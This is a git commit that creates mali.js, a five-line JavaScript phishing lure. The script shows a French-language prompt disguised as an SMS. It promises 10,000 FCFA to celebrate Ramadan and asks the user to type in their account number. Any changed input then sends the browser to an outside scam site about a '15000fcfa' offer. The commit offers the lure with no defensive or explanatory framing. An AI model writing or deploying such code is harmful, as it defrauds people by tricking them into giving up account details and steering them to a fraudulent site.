a4704d22927f6e688bb2187d970adc9518a8a0f5
newetijazz22 <newetijazz22@gmail.com>
2026-01-31 16:57:10 +0100

    Create mali.js

---
+++ mali.js
@@ -0,0 +1,5 @@
+var password = 'Retirer 15,000 FCFA'
+password=prompt('SMS: Bonjour, veuillez saisir votre numéro de compte pour recevoir 10 000 FCFA afin de célébrer le Ramadan cette année., Cliquez sur "OK" pour recevoir cette offre exceptionnelle...','Retirer 15,000 FCFA');
+if (password != 'Retirer 15,000 FCFA') {
+location.href='https://www.vrhmfed.site/15000fcfa-Ramadan';
+}
